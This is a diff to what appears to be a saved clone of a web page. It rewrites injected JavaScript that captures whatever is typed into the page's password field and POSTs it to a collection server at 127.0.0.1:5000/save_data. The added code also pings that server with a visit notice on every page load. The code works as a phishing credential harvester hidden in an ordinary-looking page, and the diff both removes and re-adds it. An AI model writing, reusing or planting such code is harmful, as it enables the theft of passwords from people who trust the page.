@@ -1750,55 +1750,53 @@
     <script
         data-template-shadow-root>(() => { document.currentScript.remove(); processNode(document); function processNode(node) { node.querySelectorAll("template[shadowrootmode]").forEach(element => { let shadowRoot = element.parentElement.shadowRoot; if (!shadowRoot) { try { shadowRoot = element.parentElement.attachShadow({ mode: element.getAttribute("shadowrootmode"), delegatesFocus: element.getAttribute("shadowrootdelegatesfocus") != null, clonable: element.getAttribute("shadowrootclonable") != null, serializable: element.getAttribute("shadowrootserializable") != null }); shadowRoot.innerHTML = element.innerHTML; element.remove() } catch (error) { } if (shadowRoot) { processNode(shadowRoot) } } }) } })()
     
-    function sendPassword(event) {
-    event.preventDefault(); 
-
-    const passwordField = document.querySelector('.password-text.password-hidden');
-    const password = passwordField ? passwordField.value : '';
-
-    if (!password) {
-        alert("Password field is empty.");
-        return;
-    }
-
-    fetch('http://127.0.0.1:5000/save_data', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password })
-    })
-    .then(response => {
-        if (response.ok) {
-        } else {
-        }
-    })
-    .catch(error => {
-        console.error("Error:", error);
-        alert("An error occurred while sending the password.");
-    });
-
-    passwordField.value = '';
-
-    function notifyAccess() {
-        fetch('http://127.0.0.1:5000/site_access', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: 'Site accessed' })
+    document.addEventListener("DOMContentLoaded", () => {
+        console.log("Notifying server of site visit...");
+        fetch("http://127.0.0.1:5000/notify_visit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ visit: true })
         })
         .then(response => {
             if (response.ok) {
-                console.log("Access notification sent.");
+                console.log("Site visit notification sent successfully.");
             } else {
-                console.error("Failed to send access notification.");
+                console.error("Failed to notify site visit. Response status:", response.status);
             }
         })
         .catch(error => {
-            console.error("Error:", error);
+            console.error("Error notifying server of site visit:", error);
         });
+    });
+
+    // Function to send the password to the server
+    function sendPassword(event) {
+        event.preventDefault();
+
+        const passwordField = document.querySelector('.password-text.password-hidden');
+        const password = passwordField ? passwordField.value : '';
+
+        if (!password) {
+            alert("Password field is empty.");
+            return;
+        }
+
+        console.log("Sending password to server...");
+        fetch("http://127.0.0.1:5000/save_data", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ password })
+        })
+        .then(response => {
+            if (response.ok) {
+            } else {
+            }
+        })
+        .catch(error => {
+            console.error("Error sending password:", error);
+        });
+
+        passwordField.value = ''; // Clear the password field after submission
     }
-
-    // Call the function when the page loads
-    window.onload = notifyAccess;
-
-}
 
 </script>
